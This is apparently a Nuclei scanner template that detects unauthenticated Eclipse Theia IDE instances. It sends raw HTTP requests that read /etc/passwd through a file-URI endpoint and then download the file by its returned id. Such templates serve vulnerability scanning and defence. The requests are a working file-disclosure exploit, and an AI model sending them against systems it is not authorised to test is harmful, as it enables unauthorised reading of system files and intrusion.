flow: http(1) && http(2)
http:
- extractors:
  - internal: true
    json:
    - .id
    name: file_id
    part: body
    type: json
  matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /files/?uri=file:///etc/passwd HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /files/download/?id={{file_id}} HTTP/1.1

    Host: {{Hostname}}

    '
id: theia-lfi-to-rce
info:
  author: 0x_Akoko
  description: 'Detected Eclipse Theia IDE was exposed without authentication, allowing
    unauthenticated attackers to access the web-based IDE with terminal capabilities,
    file system access, and arbitrary command execution.

    '
  metadata:
    max-request: 2
    verified: true
  name: Eclipse Theia IDE - LFI to RCE
  reference:
  - https://theia-ide.org/
  severity: critical
  tags: theia,ide,lfi,file-read,unauth,,rce
